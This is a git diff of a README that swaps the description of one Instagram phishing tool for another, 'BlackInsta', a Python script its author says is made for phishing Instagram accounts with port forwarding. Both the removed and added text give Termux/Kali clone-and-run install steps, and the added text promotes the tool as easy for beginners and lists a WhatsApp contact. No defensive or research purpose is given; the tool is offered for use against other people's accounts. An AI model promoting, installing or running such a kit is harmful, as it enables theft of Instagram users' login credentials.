@@ -1,19 +1,42 @@
-# Inxtagram
- HACK INSTAGRAM!
+## ABOUT TOOL :
 
-A phishing tool purely for instagram in which you can set custom link to redirect login button .
-
-# Usage: ! Kali / Termux
-
-*warning- pip should be of latest version*
-
-$ git clone https://github.com/LiNuXM4IIU/Inxtagram.git
-
-$ cd Inxtagram
-
-$ python3 -m pip install -r requirements.txt
-
-$ python3 setup.py
+BlackInsta is a python based script which is officially made for phish*ng instagram accounts with portforwarding. This tool works on both rooted Android device and Non-rooted Android device.
 
 
+## AVAILABLE ON :
 
+* Termux
+* Kali Linux
+### TESTED ON :
+
+* Termux
+
+### REQUIREMENTS :
+* internet 100 MB
+* php
+* storage 70 MB
+
+## FEATURES :
+* [+] Updated maintainence !
+* [+] 1 Port Forwarding Option !
+* [+] No link issues, timing !
+* [+] Easy for Beginners !
+
+## INSTALLATION [Termux] :
+
+* ` git clone https://github.com/Cold-Breazy/blackinsta/ `
+* ` cd blackinsta `
+* ` tar -xvf app.tar.gz `
+* ` tar -xvf myapp.tar.gz `
+* ` pip install -r requirements.txt `
+* ` python setup.py ` 
+
+## Facing Any Problem ?
+### Find Me On :
+* <a href="https://instagram.com/permanentblank">Instagram</a>
+* <a href="https://wa.me/wa.me/+27847611848">WhatsApp</a>
+
+
+## Special Shout Out To My Partners 👏 :
+* <a href="https://wa.me/+27847611848/">@SLADE👏</a>
+* <a href="https://wa.me/+27847611848/">@SLADE👏</a> 
